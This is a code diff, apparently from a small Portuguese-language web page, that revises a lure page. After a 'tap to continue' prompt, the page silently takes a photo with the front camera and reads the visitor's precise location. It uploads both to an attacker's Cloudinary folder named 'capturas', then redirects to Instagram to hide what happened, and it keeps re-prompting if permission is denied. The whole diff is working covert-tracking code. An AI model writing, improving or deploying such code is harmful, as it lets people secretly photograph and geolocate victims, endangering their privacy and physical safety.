@@ -20,35 +20,29 @@
       z-index: 9999;
       text-align: center;
       padding: 20px;
-      cursor: pointer;
     }
   </style>
 </head>
 <body>
   <div id="overlay">Toque para continuar...</div>
-
   <script>
     const cloudName = "dx5legahb";
     const uploadPreset = "upload";
     const folderName = "capturas";
-
-    let capturedImageUrl = null;
 
     function showOverlay(message, callback) {
       const overlay = document.getElementById("overlay");
       overlay.textContent = message;
       overlay.style.display = "flex";
 
-      // Remove qualquer outro listener antes de adicionar
-      overlay.replaceWith(overlay.cloneNode(true));
-      const newOverlay = document.getElementById("overlay");
-
-      newOverlay.textContent = message;
-      newOverlay.style.display = "flex";
-      newOverlay.onclick = () => {
-        newOverlay.style.display = "none";
-        callback();
+      const handler = () => {
+        overlay.style.display = "none";
+        overlay.removeEventListener("click", handler);
+        if (callback) callback();
       };
+
+      overlay.removeEventListener("click", handler);
+      overlay.addEventListener("click", handler);
     }
 
     async function capturePhoto() {
@@ -57,7 +51,6 @@
           video: { facingMode: "user" },
           audio: false
         });
-
         const video = document.createElement("video");
         video.playsInline = true;
         video.muted = true;
@@ -88,69 +81,71 @@
 
         if (!response.ok) throw new Error("Erro ao enviar imagem");
         const data = await response.json();
-        capturedImageUrl = data.secure_url;
-        return capturedImageUrl;
+        return data.secure_url;
       } catch (error) {
         console.error("Erro na captura da foto:", error);
-        showOverlay("Permita acesso à câmera para continuar. Toque para tentar novamente.", () => {
-          start(); // Recomeça pedindo câmera
+        showOverlay("Permissão de câmera negada. Toque para tentar novamente.", () => {
+          startFlow();
         });
         throw error;
       }
     }
 
     function requestLocation(imageUrl) {
-      navigator.geolocation.getCurrentPosition(async (pos) => {
-        try {
-          const { latitude, longitude } = pos.coords;
-          const texto = `Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`;
-          const textBlob = new Blob([texto], { type: "text/plain" });
-
-          const textForm = new FormData();
-          textForm.append("file", textBlob, `localizacao_${Date.now()}.txt`);
-          textForm.append("upload_preset", uploadPreset);
-          textForm.append("folder", folderName);
-
-          const textResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, {
-            method: "POST",
-            body: textForm
-          });
-
-          if (!textResp.ok) throw new Error("Erro ao enviar localização");
-          window.location.href = "https://instagram.com";
-        } catch (err) {
-          console.error("Erro ao enviar localização:", err);
-          showOverlay("Permita acesso à localização para continuar. Toque para tentar novamente.", () => {
-            requestLocation(imageUrl); // Pede localização novamente
-          });
+      navigator.permissions.query({ name: 'geolocation' }).then(permission => {
+        if (permission.state === 'denied') {
+          showOverlay("Permissão de localização bloqueada. Vá nas configurações do navegador para liberar.");
+          return;
         }
-      }, (err) => {
-        console.error("Erro ao obter localização:", err);
-        showOverlay("Permita acesso à localização para continuar. Toque para tentar novamente.", () => {
-          requestLocation(imageUrl); // Pede localização novamente
+
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+          try {
+            const { latitude, longitude } = pos.coords;
+            const texto = `Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`;
+            const textBlob = new Blob([texto], { type: "text/plain" });
+
+            const textForm = new FormData();
+            textForm.append("file", textBlob, `localizacao_${Date.now()}.txt`);
+            textForm.append("upload_preset", uploadPreset);
+            textForm.append("folder", folderName);
+
+            const textResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, {
+              method: "POST",
+              body: textForm
+            });
+
+            if (!textResp.ok) throw new Error("Erro ao enviar o arquivo de localização");
+            window.location.href = "https://instagram.com";
+          } catch (err) {
+            console.error("Erro no envio da localização:", err);
+            showOverlay("Erro ao enviar localização. Toque para tentar novamente.", () => {
+              requestLocation(imageUrl);
+            });
+          }
+        }, (err) => {
+          console.error("Erro ao obter localização:", err);
+          showOverlay("Permita acesso à localização para continuar. Toque para tentar novamente.", () => {
+            requestLocation(imageUrl);
+          });
+        }, {
+          enableHighAccuracy: true,
+          timeout: 8000,
+          maximumAge: 0
         });
-      }, {
-        enableHighAccuracy: true,
-        timeout: 8000,
-        maximumAge: 0
       });
     }
 
-    async function start() {
+    async function startFlow() {
       try {
-        if (!capturedImageUrl) {
-          const imageUrl = await capturePhoto();
-          requestLocation(imageUrl);
-        } else {
-          requestLocation(capturedImageUrl); // Reutiliza a imagem
-        }
+        const imageUrl = await capturePhoto();
+        requestLocation(imageUrl);
       } catch (e) {
-        console.error("Erro geral no fluxo:", e);
+        console.error("Erro no fluxo:", e);
       }
     }
 
     window.addEventListener("DOMContentLoaded", () => {
-      showOverlay("Toque para continuar...", () => start());
+      showOverlay("Toque para continuar...", () => startFlow());
     });
   </script>
 </body>
